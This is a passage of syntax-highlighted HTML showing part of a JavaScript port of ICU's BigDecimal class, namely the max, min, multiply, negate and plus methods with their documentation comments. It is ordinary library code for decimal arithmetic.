&lt;code&gt;rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Returns the larger of the current object and the first parameter.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If calling the &#123;@link #compareTo(BigDecimal, MathContext)&#125; method</span></span><br><span class="line"><span class="comment">  * with the same parameters would return &lt;code&gt;1&lt;/code&gt; or</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;0&lt;/code&gt;, then the result of calling the</span></span><br><span class="line"><span class="comment">  * &#123;@link #plus(MathContext)&#125; method on the current object (using the</span></span><br><span class="line"><span class="comment">  * same &lt;code&gt;MathContext&lt;/code&gt; parameter) is returned.</span></span><br><span class="line"><span class="comment">  * Otherwise, the result of calling the &#123;@link #plus(MathContext)&#125;</span></span><br><span class="line"><span class="comment">  * method on the first parameter object (using the same</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;MathContext&lt;/code&gt; parameter) is returned.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the comparison.</span></span><br><span class="line"><span class="comment">  * @param  set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *             the maximum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal max(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">max</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> set;</span><br><span class="line">  <span class="keyword">if</span> (max.arguments.length == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = max.arguments[<span class="number">1</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (max.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = <span class="keyword">this</span>.plainMC;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"max(): "</span> + max.arguments.length + <span class="string">" arguments given; expected 1 or 2"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">var</span> rhs = max.arguments[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">this</span>.compareTo(rhs,set))&gt;=<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">this</span>.plus(set);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   <span class="keyword">return</span> rhs.plus(set);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * the minimum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #min(BigDecimal, MathContext)&#125;,</span></span><br><span class="line"><span class="comment">  * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the comparison.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *             the minimum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal min(com.ibm.icu.math.BigDecimal rhs)&#123;</span></span><br><span class="line"> <span class="comment">//-- return this.min(rhs,plainMC);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * the minimum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Returns the smaller of the current object and the first parameter.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * If calling the &#123;@link #compareTo(BigDecimal, MathContext)&#125; method</span></span><br><span class="line"><span class="comment">  * with the same parameters would return &lt;code&gt;-1&lt;/code&gt; or</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;0&lt;/code&gt;, then the result of calling the</span></span><br><span class="line"><span class="comment">  * &#123;@link #plus(MathContext)&#125; method on the current object (using the</span></span><br><span class="line"><span class="comment">  * same &lt;code&gt;MathContext&lt;/code&gt; parameter) is returned.</span></span><br><span class="line"><span class="comment">  * Otherwise, the result of calling the &#123;@link #plus(MathContext)&#125;</span></span><br><span class="line"><span class="comment">  * method on the first parameter object (using the same</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;MathContext&lt;/code&gt; parameter) is returned.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the comparison.</span></span><br><span class="line"><span class="comment">  * @param  set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *             the minimum of &lt;code&gt;this&lt;/code&gt; and &lt;code&gt;rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal min(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">min</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> set;</span><br><span class="line">  <span class="keyword">if</span> (min.arguments.length == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = min.arguments[<span class="number">1</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (min.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = <span class="keyword">this</span>.plainMC;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"min(): "</span> + min.arguments.length + <span class="string">" arguments given; expected 1 or 2"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">var</span> rhs = min.arguments[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">this</span>.compareTo(rhs,set))&lt;=<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">this</span>.plus(set);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   <span class="keyword">return</span> rhs.plus(set);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;this*rhs&lt;/code&gt;, using fixed point arithmetic.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #add(BigDecimal, MathContext)&#125;,</span></span><br><span class="line"><span class="comment">  * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The length of the decimal part (the scale) of the result will be</span></span><br><span class="line"><span class="comment">  * the sum of the scales of the operands, if they were formatted</span></span><br><span class="line"><span class="comment">  * without exponential notation.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the multiplication.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *             &lt;code&gt;this*rhs&lt;/code&gt;, using fixed point arithmetic.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal multiply(com.ibm.icu.math.BigDecimal rhs)&#123;</span></span><br><span class="line"> <span class="comment">//-- return this.multiply(rhs,plainMC);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is &lt;code&gt;this*rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Implements the multiplication (&lt;b&gt;&lt;code&gt;*&lt;/code&gt;&lt;/b&gt;) operator</span></span><br><span class="line"><span class="comment">  * (as defined in the decimal documentation, see &#123;@link BigDecimal</span></span><br><span class="line"><span class="comment">  * class header&#125;),</span></span><br><span class="line"><span class="comment">  * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The &lt;code&gt;BigDecimal&lt;/code&gt; for the right hand side of</span></span><br><span class="line"><span class="comment">  *             the multiplication.</span></span><br><span class="line"><span class="comment">  * @param  set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings.</span></span><br><span class="line"><span class="comment">  * @return     A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *             &lt;code&gt;this*rhs&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal multiply(com.ibm.icu.math.BigDecimal rhs,com.ibm.icu.math.MathContext set)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">multiply</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> set;</span><br><span class="line">  <span class="keyword">if</span> (multiply.arguments.length == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = multiply.arguments[<span class="number">1</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (multiply.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = <span class="keyword">this</span>.plainMC;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"multiply(): "</span> + multiply.arguments.length + <span class="string">" arguments given; expected 1 or 2"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">var</span> rhs = multiply.arguments[<span class="number">0</span>];</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal lhs;</span></span><br><span class="line">  <span class="keyword">var</span> lhs;</span><br><span class="line">  <span class="comment">//--int padding;</span></span><br><span class="line">  <span class="keyword">var</span> padding;</span><br><span class="line">  <span class="comment">//--int reqdig;</span></span><br><span class="line">  <span class="keyword">var</span> reqdig;</span><br><span class="line">  <span class="comment">//--byte multer[]=null;</span></span><br><span class="line">  <span class="keyword">var</span> multer=<span class="literal">null</span>;</span><br><span class="line">  <span class="comment">//--byte multand[]=null;</span></span><br><span class="line">  <span class="keyword">var</span> multand=<span class="literal">null</span>;</span><br><span class="line">  <span class="comment">//--int multandlen;</span></span><br><span class="line">  <span class="keyword">var</span> multandlen;</span><br><span class="line">  <span class="comment">//--int acclen=0;</span></span><br><span class="line">  <span class="keyword">var</span> acclen=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal res;</span></span><br><span class="line">  <span class="keyword">var</span> res;</span><br><span class="line">  <span class="comment">//--byte acc[];</span></span><br><span class="line">  <span class="keyword">var</span> acc;</span><br><span class="line">  <span class="comment">//--int n=0;</span></span><br><span class="line">  <span class="keyword">var</span> n=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--byte mult=0;</span></span><br><span class="line">  <span class="keyword">var</span> mult=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (set.lostDigits)</span><br><span class="line">   <span class="keyword">this</span>.checkdigits(rhs,set.digits);</span><br><span class="line">  lhs=<span class="keyword">this</span>; <span class="comment">// name for clarity and proxy</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Prepare numbers (truncate, unless unlimited precision) */</span></span><br><span class="line">  padding=<span class="number">0</span>; <span class="comment">// trailing 0's to add</span></span><br><span class="line">  reqdig=set.digits; <span class="comment">// local copy</span></span><br><span class="line">  <span class="keyword">if</span> (reqdig&gt;<span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">if</span> (lhs.mant.length&gt;reqdig)</span><br><span class="line">     lhs=<span class="keyword">this</span>.clone(lhs).round(set);</span><br><span class="line">    <span class="keyword">if</span> (rhs.mant.length&gt;reqdig)</span><br><span class="line">     rhs=<span class="keyword">this</span>.clone(rhs).round(set);</span><br><span class="line">   <span class="comment">// [we could reuse the new LHS for result in this case]</span></span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;<span class="comment">/* unlimited */</span></span><br><span class="line">    <span class="comment">// fixed point arithmetic will want every trailing 0; we add these</span></span><br><span class="line">    <span class="comment">// after the calculation rather than before, for speed.</span></span><br><span class="line">    <span class="keyword">if</span> (lhs.exp&gt;<span class="number">0</span>)</span><br><span class="line">     padding=padding+lhs.exp;</span><br><span class="line">    <span class="keyword">if</span> (rhs.exp&gt;<span class="number">0</span>)</span><br><span class="line">     padding=padding+rhs.exp;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// For best speed, as in DMSRCN, we use the shorter number as the</span></span><br><span class="line">  <span class="comment">// multiplier and the longer as the multiplicand.</span></span><br><span class="line">  <span class="comment">// 1999.12.22: We used to special case when the result would fit in</span></span><br><span class="line">  <span class="comment">//             a long, but with Java 1.3 this gave no advantage.</span></span><br><span class="line">  <span class="keyword">if</span> (lhs.mant.length&lt;rhs.mant.length)</span><br><span class="line">   &#123;</span><br><span class="line">    multer=lhs.mant;</span><br><span class="line">    multand=rhs.mant;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    multer=rhs.mant;</span><br><span class="line">    multand=lhs.mant;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Calculate how long result byte array will be */</span></span><br><span class="line">  multandlen=(multer.length+multand.length)<span class="number">-1</span>; <span class="comment">// effective length</span></span><br><span class="line">  <span class="comment">// optimize for 75% of the cases where a carry is expected...</span></span><br><span class="line">  <span class="keyword">if</span> ((multer[<span class="number">0</span>]*multand[<span class="number">0</span>])&gt;<span class="number">9</span>)</span><br><span class="line">   acclen=multandlen+<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   acclen=multandlen;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Now the main long multiplication loop */</span></span><br><span class="line">  res=<span class="keyword">new</span> BigDecimal(); <span class="comment">// where we'll build result</span></span><br><span class="line">  acc=<span class="keyword">this</span>.createArrayWithZeros(acclen); <span class="comment">// accumulator, all zeros</span></span><br><span class="line">  <span class="comment">// 1998.07.01: calculate from left to right so that accumulator goes</span></span><br><span class="line">  <span class="comment">// to likely final length on first addition; this avoids a one-digit</span></span><br><span class="line">  <span class="comment">// extension (and object allocation) each time around the loop.</span></span><br><span class="line">  <span class="comment">// Initial number therefore has virtual zeros added to right.</span></span><br><span class="line">  &#123;<span class="keyword">var</span> $<span class="number">7</span>=multer.length;n=<span class="number">0</span>;n:<span class="keyword">for</span>(;$<span class="number">7</span>&gt;<span class="number">0</span>;$<span class="number">7</span>--,n++)&#123;</span><br><span class="line">   mult=multer[n];</span><br><span class="line">   <span class="keyword">if</span> (mult!=<span class="number">0</span>)</span><br><span class="line">    &#123; <span class="comment">// [optimization]</span></span><br><span class="line">     <span class="comment">// accumulate [accumulator is reusable array]</span></span><br><span class="line">     acc=<span class="keyword">this</span>.byteaddsub(acc,acc.length,multand,multandlen,mult,<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">// divide multiplicand by 10 for next digit to right</span></span><br><span class="line">   multandlen--; <span class="comment">// 'virtual length'</span></span><br><span class="line">   &#125;</span><br><span class="line">  &#125;<span class="comment">/*n*/</span></span><br><span class="line"></span><br><span class="line">  res.ind=lhs.ind*rhs.ind; <span class="comment">// final sign</span></span><br><span class="line">  res.exp=(lhs.exp+rhs.exp)-padding; <span class="comment">// final exponent</span></span><br><span class="line">  <span class="comment">// [overflow is checked by finish]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* add trailing zeros to the result, if necessary */</span></span><br><span class="line">  <span class="keyword">if</span> (padding==<span class="number">0</span>)</span><br><span class="line">   res.mant=acc;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   res.mant=<span class="keyword">this</span>.extend(acc,acc.length+padding); <span class="comment">// add trailing 0s</span></span><br><span class="line">  <span class="keyword">return</span> res.finish(set,<span class="literal">false</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;-this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #negate(MathContext)&#125;, where the context is</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The length of the decimal part (the scale) of the result will be</span></span><br><span class="line"><span class="comment">  * be &lt;code&gt;this.scale()&lt;/code&gt;</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *         &lt;code&gt;-this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal negate()&#123;</span></span><br><span class="line"> <span class="comment">//-- return this.negate(plainMC);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is &lt;code&gt;-this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Implements the negation (Prefix &lt;b&gt;&lt;code&gt;-&lt;/code&gt;&lt;/b&gt;) operator</span></span><br><span class="line"><span class="comment">  * (as defined in the decimal documentation, see &#123;@link BigDecimal</span></span><br><span class="line"><span class="comment">  * class header&#125;),</span></span><br><span class="line"><span class="comment">  * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings.</span></span><br><span class="line"><span class="comment">  * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *         &lt;code&gt;-this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//public com.ibm.icu.math.BigDecimal negate(com.ibm.icu.math.MathContext set)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">negate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> set;</span><br><span class="line">  <span class="keyword">if</span> (negate.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = negate.arguments[<span class="number">0</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (negate.arguments.length == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = <span class="keyword">this</span>.plainMC;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"negate(): "</span> + negate.arguments.length + <span class="string">" arguments given; expected 0 or 1"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal res;</span></span><br><span class="line">  <span class="keyword">var</span> res;</span><br><span class="line">  <span class="comment">// Originally called minus(), changed to matched Java precedents</span></span><br><span class="line">  <span class="comment">// This simply clones, flips the sign, and possibly rounds</span></span><br><span class="line">  <span class="keyword">if</span> (set.lostDigits)</span><br><span class="line">   <span class="keyword">this</span>.checkdigits(<span class="literal">null</span>,set.digits);</span><br><span class="line">  res=<span class="keyword">this</span>.clone(<span class="keyword">this</span>); <span class="comment">// safe copy</span></span><br><span class="line">  res.ind=-res.ind;</span><br><span class="line">  <span class="keyword">return</span> res.finish(set,<span class="literal">false</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;+this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * Note that &lt;code&gt;this&lt;/code&gt; is not necessarily a</span></span><br><span class="line"><span class="comment">  * plain &lt;code&gt;BigDecimal&lt;/code&gt;, but the result will always be.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #plus(MathContext)&#125;, where the context is</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The length of the decimal part (the scale) of the result will be</span></span><br><span class="line"><span class="comment">  * be &lt;code&gt;this.scale()&lt;/code&gt;</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *         &lt;code&gt;+this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public com.ibm.icu.math.BigDecimal plus()&#123;</span></span><br><span class="line"> <span class="comment">//-- return this.plus(plainMC);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;+this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Implements the plus (Prefix &lt;b&gt;&lt;code&gt;+&lt;/code&gt;&lt;/b&gt;) operator</span></span><br><span class="line"><span class="comment">  * (as defined in the decimal documentation, see &#123;@link BigDecimal</span></span><br><span class="line"><span class="comment">  * class header&#125;),</span></span><br><span class="line"><span class="comment">  * and returns the result as a &lt;code&gt;BigDecimal&lt;/code&gt; object.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * This method is useful for rounding or otherwise applying a context</span></span><br><span class="line"><span class="comment">  * to a decimal value.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  set The &lt;code&gt;MathContext&lt;/code&gt; arithmetic settings.</span></span><br><span class="line"><span class="comment">  * @return A &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  *         &lt;code&gt;+this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//public com.ibm.icu.math.BigDecimal plus(com.ibm.icu.math.MathContext set)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">plus</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> set;</span><br><span class="line">  <span class="keyword">if</span> (plus.arguments.length == <span class="number">1</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = plus.arguments[<span class="number">0</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (plus.arguments.length == <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    set = <span class="keyword">this</span>.plainMC;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"plus(): "</span> + plus.arguments.length + <span class="string">" arguments given; expected 0 or 1"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">// This clones and forces the result to the new settings</span></span><br><span class="line">  <span class="comment">// May return same object</span></span><br><span class="line">  <span class="keyword">if</span> (set.lostDigits)</span><br><span class="line">   <span class="keyword">this</span>.checkdigits(<span class="literal">null</span>,set.digits);</span><br><span class="line">  <span class="comment">// Optimization: returns same object for some common cases</span></span><br><span class="line">  <span class="keyword">if</span> (set.form==MathContext.prototype.PLAIN)</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.form==MathContext.prototype.PLAIN)</span><br><span class="line">    &#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">this</span>.mant.length&lt;=set.digits)</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">     <span class="keyword">if</span> (set.digits==<span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.clone(<span class="keyword">this</span>).finish(set,<span class="literal">false</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a plain &lt;code&gt;BigDecimal&lt;/code&gt; whose value is</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;this**rhs&lt;/code&gt;, using fixed point arithmetic.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The same as &#123;@link #pow(BigDecimal, MathContext)&#125;,</span></span><br><span class="line"><span class="comment">  * where the &lt;code&gt;BigDecimal&lt;/code&gt; is &lt;code&gt;rhs&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * and the context is &lt;code&gt;new MathContext(0, MathContext.PLAIN)&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The parameter is the power to which the &lt;code&gt;this&lt;/code&gt; will be</span></span><br><span class="line"><span class="comment">  * raised; it must be in the range 0 through 999999999, and must</span></span><br><span class="line"><span class="comment">  * have a decimal part of zero.  Note that these restrictions may be</span></span><br><span class="line"><span class="comment">  * removed in the future, so they should not be used as a test for a</span></span><br><span class="line"><span class="comment">  * whole number.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * In addition, the power must not be negative, as no</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;MathContext&lt;/code&gt; is used and so the result would then</span></span><br><span class="line"><span class="comment">  * always be 0.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  rhs The 